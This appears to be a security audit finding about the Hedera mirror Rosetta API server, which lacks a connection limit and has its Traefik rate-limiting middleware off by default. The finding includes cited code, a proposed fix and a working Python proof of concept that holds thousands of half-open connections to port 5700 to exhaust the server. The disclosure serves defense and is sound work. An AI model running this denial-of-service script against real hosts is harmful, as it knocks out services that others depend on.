### Title
No Application-Level Connection Limit on Rosetta API Port Allows TCP Connection Exhaustion by Unprivileged Attackers

### Summary
The Rosetta API HTTP server in `rosetta/main.go` is constructed with no maximum concurrent connection limit. The only protective layer — Traefik middleware with `inFlightReq` and `rateLimit` — is disabled by default (`global.middleware: false` in `charts/hedera-mirror-rosetta/values.yaml`). An unprivileged external attacker can open thousands of simultaneous TCP connections to port 5700, exhausting the process's file descriptor table and preventing legitimate `/construction/submit` requests from being accepted, blocking transaction gossip.

### Finding Description

**Exact code path:**

`rosetta/main.go` lines 220–227 construct the HTTP server:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

Go's `net/http.Server` has no built-in `MaxConns` field. The standard mitigation is to wrap the listener with `golang.org/x/net/netutil.LimitListener`. No such wrapping exists anywhere in the rosetta Go codebase — confirmed by the absence of any match for `LimitListener`, `MaxConns`, `netutil`, `semaphore`, or `throttle` in `rosetta/**/*.go`.

**Root cause:** The `Config` struct (`rosetta/app/config/types.go` lines 19–33) exposes `Http Http` with only timeout fields and `Port uint16`. There is no `MaxConnections` or equivalent field, and no connection-limiting logic is applied at the listener level.

**Failed assumption:** The design assumes that the Traefik middleware chain will enforce per-IP in-flight request limits and rate limits before connections reach the Go server. However, `charts/hedera-mirror-rosetta/templates/middleware.yaml` line 3 gates the entire middleware chain on `{{ if and .Values.global.middleware .Values.middleware }}`, and `charts/hedera-mirror-rosetta/values.yaml` line 95 sets `global.middleware: false` by default. The middleware is therefore **not deployed in a default installation**.

**Why timeouts are insufficient:** The configured `ReadHeaderTimeout` (3 s) and `IdleTimeout` (10 s) close *inactive* connections, but they do not prevent an attacker from holding connections open by trickling data. More importantly, they do not cap the *number* of simultaneously accepted connections. Each accepted connection consumes one OS file descriptor. A typical Linux process limit is 65 536 file descriptors. An attacker sustaining ~22 000 connections/second (trivially achievable from a single host with `ulimit -n` raised) keeps the descriptor table saturated continuously.

### Impact Explanation

When the file descriptor table is exhausted, `accept()` calls fail with `EMFILE`/`ENFILE`. The Go HTTP server logs the error and stops accepting new connections. All subsequent `/construction/submit` POST requests are refused at the TCP level — the three-way handshake completes (the kernel still accepts SYNs into the backlog) but the application never reads the request, so no transaction is gossiped to the Hedera network. This is a complete, targeted denial of the transaction-submission path with no collateral requirement on the attacker's side.

### Likelihood Explanation

- **Precondition:** Network reachability to port 5700. In the default Docker deployment (`-p 5700:5700`) and the default Kubernetes ingress (`ingress.enabled: true`), this port is publicly exposed.
- **Attacker capability:** No credentials, no protocol knowledge, no amplification needed. A single commodity machine with a high `ulimit -n` and a tool such as `hping3`, `wrk`, or a trivial Python `socket` loop suffices.
- **Repeatability:** The attack is stateless and can be restarted immediately after the server recovers.
- **Existing check reviewed:** The Traefik `inFlightReq` (amount: 5 per IP) and `rateLimit` (average: 10 per host) values in `charts/hedera-mirror-rosetta/values.yaml` lines 152–160 would be adequate mitigations, but they are rendered as a no-op because `global.middleware` defaults to `false`.

### Recommendation

1. **Application layer (primary fix):** Wrap the TCP listener with `netutil.LimitListener` before passing it to `httpServer.Serve()`:
   ```go
   import "golang.org/x/net/netutil"
   ln, _ := net.Listen("tcp", httpServer.Addr)
   ln = netutil.LimitListener(ln, maxConns) // e.g. 1000
   httpServer.Serve(ln)
   ```
   Add a `MaxConnections int` field to `Config` / `Http` in `rosetta/app/config/types.go` with a safe default (e.g. 1000).

2. **Helm chart (secondary fix):** Change the default of `global.middleware` to `true` in `charts/hedera-mirror-rosetta/values.yaml` so that the Traefik `inFlightReq` and `rateLimit` middlewares are active in every deployment.

3. **OS hardening:** Set `LimitNOFILE` in the container/systemd unit to a low value (e.g. 4096) to bound the blast radius.

### Proof of Concept

```bash
# Requires: Python 3, network access to the Rosetta host
python3 - <<'EOF'
import socket, time, threading

HOST = "rosetta-host"  # replace with actual host
PORT = 5700
CONNS = 5000

socks = []
def open_conn():
    s = socket.socket()
    s.settimeout(60)
    try:
        s.connect((HOST, PORT))
        # Send partial HTTP header to stay past ReadHeaderTimeout
        s.send(b"POST /construction/submit HTTP/1.1\r\nHost: " + HOST.encode())
        socks.append(s)
    except Exception as e:
        pass

threads = [threading.Thread(target=open_conn) for _ in range(CONNS)]
for t in threads: t.start()
for t in threads: t.join()

print(f"Held {len(socks)} connections open")
# Legitimate request now fails:
import urllib.request
try:
    urllib.request.urlopen(f"http://{HOST}:{PORT}/network/list", timeout=5)
    print("FAIL: server still responding")
except Exception as e:
    print(f"SUCCESS: server unreachable — {e}")
time.sleep(30)
EOF
```

Expected result: after `CONNS` connections are held open, new connection attempts to port 5700 time out or are refused, and `/construction/submit` cannot be reached. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/config/types.go (L19-33)
```go
type Config struct {
	Cache               map[string]Cache
	Db                  Db
	Feature             Feature
	Http                Http
	Log                 Log
	Network             string
	NodeRefreshInterval time.Duration `yaml:"nodeRefreshInterval"`
	NodeVersion         string        `yaml:"nodeVersion"`
	Nodes               NodeMap
	Online              bool
	Port                uint16
	Response            Response
	ShutdownTimeout     time.Duration `yaml:"shutdownTimeout"`
}
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L95-95)
```yaml
  middleware: false
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
